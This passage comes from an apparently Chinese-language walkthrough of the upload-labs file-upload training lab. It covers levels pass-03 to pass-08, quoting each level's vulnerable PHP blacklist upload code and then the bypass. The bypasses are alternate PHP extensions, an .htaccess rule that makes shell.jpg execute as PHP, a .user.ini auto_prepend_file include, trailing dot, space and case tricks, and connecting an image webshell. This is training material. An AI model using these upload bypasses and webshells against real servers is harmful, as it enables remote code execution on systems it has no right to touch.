<span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上传<br>黑名单,可以上传php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)来绕过<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151358837.png?token=ARYCSASGG5H7RMOU5IWLQVTCQCLKW"></p></li></ul><h1 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上传<br>黑名单,几乎所有可以上传的文件类型都被写死,但是可以上传<code>.htaccess</code><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151358987.png?token=ARYCSASLEZWUEELFPZCTEH3CQCLMM"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;shell.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>这个文件里面的含义就是将shell.jpg文件解析为php<br>然后直接上传图片马,就可以解析为php</p></li></ul><h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><ul><li>源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>上传<br>禁止了常见后缀名,也包括<code>.htaccess</code>,反复观察发现没有被限制的后缀名有 .php7 以及 .ini<br>php.ini 是 php的配置文件，.user.ini 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。<br>但是想要引发 .user.ini 解析漏洞需要三个前提条件  <ol><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件</li></ol></li></ul><p>提示<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151401289.png?token=ARYCSAUFA3AA2N463WLCMDDCQCLYM"></p><p>上传.user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_ prepend_ file=shell.jpg</span><br><span class="line">意思是所有文件都包含shell.jpg   </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151400641.png?token=ARYCSAWQQMVZ5I6Q4I65BEDCQCLUK"></p><p>再上传图片马,蚁剑连接readme.php文件,图片马就被包含进去以php代码执行</p><ul><li>第二种方法绕过<br>抓包修改后缀为<code>shell.php. .</code> 点空格点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151402043.png?token=ARYCSAXVVJ6A3HXU4ZPN7OLCQCL3I"><br>蚁剑连接shell.php即可</li></ul><h1 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上传</p></li></ul><p>黑名单,但是可以使用大小写绕过<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151402989.png?token=ARYCSAXILS6YHXAJALNEEP3CQCL4S"></p><h1 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上传<br>黑名单,但是没有去掉空格,使用空格绕过</p></li></ul><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151403273.png?token=ARYCSAU4TV7KUZUINL5LNKDCQCL6E"></p><h1 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 